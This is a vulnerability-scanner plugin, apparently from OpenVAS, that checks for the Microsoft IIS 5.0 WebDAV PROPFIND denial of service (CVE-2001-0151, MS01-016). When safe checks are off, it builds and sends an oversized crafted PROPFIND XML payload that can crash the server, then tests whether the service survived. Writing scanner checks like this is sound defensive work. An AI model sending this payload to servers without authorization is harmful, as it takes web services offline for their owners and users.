# SPDX-FileCopyrightText: 2001 John Lampe
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10667");
  script_version("2023-10-10T05:05:41+0000");
  script_cve_id("CVE-2001-0151");
  script_tag(name:"last_modification", value:"2023-10-10 05:05:41 +0000 (Tue, 10 Oct 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Microsoft IIS 5.0 PROPFIND DoS Vulnerability (MS01-016) - Active Check");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2001 John Lampe");
  script_family("Denial of Service");
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("microsoft/iis/http/detected");

  script_xref(name:"URL", value:"https://learn.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-016");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2453");
  script_xref(name:"URL", value:"http://support.microsoft.com/support/kb/articles/Q241/5/20.AS");

  script_tag(name:"summary", value:"Microsoft Internet Information Services (IIS) server is prone
  to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Depending on the 'safe_checks' setting of the scan
  configuration:

  - Setting 'yes': Sends a crafted HTTP PROPFIND request and checks if the response is matching
  one of an affected system

  - Setting 'no': Sends a crafted HTTP PROPFIND request and checks if the system is still responding
  afterwards");

  script_tag(name:"insight", value:"It was possible to disable the remote IIS server by making a
  variation of a specially formed PROPFIND request.");

  script_tag(name:"impact", value:"An attacker, exploiting this vulnerability, would be able to
  render the web service useless. If the server is 'business critical', the impact could be high.");

  script_tag(name:"affected", value:"Microsoft IIS 5.0 is known to be affected.");

  script_tag(name:"solution", value:"Disable the WebDAV extensions, as well as the PROPFIND
  command.

  Please see the references for more information.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

host = http_host_name(port:port);

if(safe_checks()) {

  req = string("PROPFIND / HTTP/1.0", "\r\n",
               "Host: ", host, "\r\n\r\n");
  r = http_send_recv(port:port, data:req);
  if(r && r =~ "^HTTP/1\.[01] 411" && egrep(pattern:"^[Ss]erver\s*:.*IIS", string:r)) {
    security_message(port:port);
    exit(0);
  }
  exit(99);
}

req = http_get(item:"/", port:port);
r = http_send_recv(port:port, data:req);
if(!r)
  exit(0);

soc2 = http_open_socket(port);
if(!soc2)
  exit(0);

mylen = 59060;
quote = raw_string(0x22);
xml = string ("<?xml version=",
      quote,
      "1.0",
      quote,
      "?><a:propfind xmlns:a=",
      quote,
      "DAV:",
      quote,
      " xmlns:u=",
      quote,
      crap(length:mylen, data:":"),
      ":",
      quote,
      ">",
      "<a:prop><a:displayname /><u:",
      "AAAA",
      crap(length:mylen, data:":"),
      crap(length:64, data:"A"),
      " /></a:prop></a:propfind>\r\n\r\n");

l = strlen(xml);
req = string("PROPFIND / HTTP/1.1\r\n",
             "Content-type: text/xml\r\n",
             "Host: ", host, "\r\n",
             "Content-length: ", l, "\r\n\r\n", xml, "\r\n\r\n\r\n");

send(socket:soc2, data:req);
http_recv(socket:soc2);
http_close_socket(soc2);

sleep(1);
soc3 = http_open_socket(port);
if(soc3) {
  req = http_get(item:"/", port:port);
  send(socket:soc3, data:req);
  r = http_recv(socket:soc3);
  http_close_socket(soc3);
  if(!r) {
    security_message(port:port);
    exit(0);
  } else {
    if(r =~ "^HTTP/1\.[01] 500") {
      security_message(port:port);
      exit(0);
    }
  }
} else {
  security_message(port:port);
  exit(0);
}

exit(99);
